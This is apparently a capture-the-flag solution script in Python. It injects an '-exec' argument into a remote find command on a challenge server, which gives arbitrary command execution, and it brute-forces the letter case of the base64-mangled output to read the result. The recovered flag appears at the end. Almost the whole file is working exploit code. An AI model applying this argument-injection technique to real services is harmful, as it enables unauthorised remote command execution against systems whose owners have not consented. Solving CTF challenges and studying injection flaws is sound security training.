from itertools import product
from base64 import b64decode
import operator
import string
from requests import get
from urllib.parse import urlencode
from sys import argv

def brute_block(block):
    var = []
    for b in block:
        if b.isalpha(): var.append([b.upper(), b.lower()])
        else: var.append([b])

    results = {}
    for comb in product(*var):
        s = ''.join(comb)
        decoded = b64decode(s)
        results[s] = score(decoded)

    m = max(results.items(), key=operator.itemgetter(1))[1]
    best = [b64decode(k) for k, v in results.items() if v == m]
    return best

def score(s):
    res = 0

    s1 = string.ascii_lowercase.encode('ascii')
    s2 = ('/_-+. {}').encode('ascii')
    s3 = (string.ascii_uppercase + string.digits).encode('ascii')
    s4 = ('\n\r\t~@').encode('ascii')

    for c in s:
        if c in s1:
            res += 4
        elif c in s2:
            res += 3
        elif c in s3:
            res += 2
        elif c in s4:
            res += 1
    return res

def brute_blocks(s):
    blocks = [s[i:i+4] for i in range(0, len(s), 4)]
    sol = []
    for b in blocks:
        r = brute_block(b)
        sol.append(r[0])

    return b''.join(sol)

args = urlencode({
    "arg": f"sth -or -exec {argv[1]} ; -quit",
})
url = f"http://35.242.239.180:30233/?start&{args}"
r = get(url).text

print (argv[1])
print ('---')
decoded = brute_blocks(r).decode('ascii')
print (decoded)

# ctf{aaf15cacfba615d51372386909c4771f0836284ad1a539bcef49201c660631ed}

